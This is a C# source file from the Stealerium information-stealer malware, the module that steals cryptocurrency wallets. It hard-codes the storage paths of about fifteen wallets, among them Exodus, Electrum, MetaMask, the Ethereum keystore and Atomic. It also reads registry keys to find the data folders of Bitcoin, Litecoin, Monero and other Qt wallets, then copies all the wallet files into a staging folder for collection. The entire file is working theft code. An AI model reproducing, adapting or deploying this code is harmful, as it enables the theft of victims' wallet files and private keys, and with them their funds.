using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using Stealerium.Helpers;

namespace Stealerium.Target
{
    internal sealed class Wallets
    {
        // Helper methods to get paths for AppData and LocalAppData
        private static string GetAppDataPath(string subDir)
        {
            return Path.Combine(Paths.Appdata, subDir);
        }

        private static string GetLocalAppDataPath(string subDir)
        {
            return Path.Combine(Paths.Lappdata, subDir);
        }

        // Wallet directories list
        private static readonly List<string[]> KnownWalletDirectories = new List<string[]>
        {
            new[] { "Zcash", GetAppDataPath("Zcash") },
            new[] { "Armory", GetAppDataPath("Armory") },
            new[] { "Bytecoin", GetAppDataPath("bytecoin") },
            new[] { "Jaxx", GetAppDataPath("com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb") },
            new[] { "Exodus", GetAppDataPath("Exodus\\exodus.wallet") },
            new[] { "Ethereum", GetAppDataPath("Ethereum\\keystore") },
            new[] { "Electrum", GetAppDataPath("Electrum\\wallets") },
            new[] { "AtomicWallet", GetAppDataPath("atomic\\Local Storage\\leveldb") },
            new[] { "Guarda", GetAppDataPath("Guarda\\Local Storage\\leveldb") },
            new[] { "Coinomi", GetLocalAppDataPath("Coinomi\\Coinomi\\wallets") },
            new[] { "Binance", GetAppDataPath("Binance") },
            new[] { "Coinbase", GetLocalAppDataPath("Coinbase") },
            new[] { "TronLink", GetAppDataPath("TronLink\\Local Storage\\leveldb") },
            new[] { "MetaMask", GetLocalAppDataPath("MetaMask\\IndexedDB\\file__0.indexeddb.leveldb") },
            new[] { "TrustWallet", GetAppDataPath("TrustWallet\\Local Storage\\leveldb") }
        };

        // Wallets list from registry
        private static readonly string[] KnownWalletsInRegistry =
        {
            "Litecoin",
            "Dash",
            "Bitcoin",
            "Monero",
            "Dogecoin"
        };

        // Collect wallets and write to the specified directory
        public static void GetWallets(string saveDir)
        {
            try
            {
                // Collect wallets from known directories
                foreach (var wallet in KnownWalletDirectories)
                {
                    CopyWalletFromDirectoryTo(saveDir, wallet[1], wallet[0]);
                }

                // Collect wallets from registry entries
                foreach (var wallet in KnownWalletsInRegistry)
                {
                    CopyWalletFromRegistryTo(saveDir, wallet);
                }

                // If no wallets found, delete the save directory if it exists
                if (Counter.Wallets == 0 && Directory.Exists(saveDir))
                {
                    Filemanager.RecursiveDelete(saveDir);
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Wallets >> Failed to collect wallets\n{ex}");
            }
        }

        // Copy wallet files from directory to the specified save directory
        private static void CopyWalletFromDirectoryTo(string saveDir, string walletDir, string walletName)
        {
            if (!Directory.Exists(walletDir)) return;

            // Create saveDir if it doesn't exist
            if (!Directory.Exists(saveDir))
            {
                Directory.CreateDirectory(saveDir);
            }

            var destinationDir = Path.Combine(saveDir, walletName);
            Filemanager.CopyDirectory(walletDir, destinationDir);
            Counter.Wallets++;

            Logging.Log($"Wallets >> Successfully copied wallet files for {walletName}");
        }

        // Copy wallet data from registry to the specified save directory
        private static void CopyWalletFromRegistryTo(string saveDir, string walletRegistry)
        {
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey(walletRegistry)?.OpenSubKey($"{walletRegistry}-Qt"))
                {
                    if (registryKey == null) return;

                    var walletDir = registryKey.GetValue("strDataDir")?.ToString();
                    if (string.IsNullOrEmpty(walletDir) || !Directory.Exists(walletDir)) return;

                    var sourceDir = Path.Combine(walletDir, "wallets");

                    // Create saveDir if it doesn't exist
                    if (!Directory.Exists(saveDir))
                    {
                        Directory.CreateDirectory(saveDir);
                    }

                    var destinationDir = Path.Combine(saveDir, walletRegistry);
                    Filemanager.CopyDirectory(sourceDir, destinationDir);
                    Counter.Wallets++;

                    Logging.Log($"Wallets >> Successfully copied {walletRegistry} wallet from registry");
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Wallets >> Failed to collect wallet from registry for {walletRegistry}\n{ex}");
            }
        }
    }
}
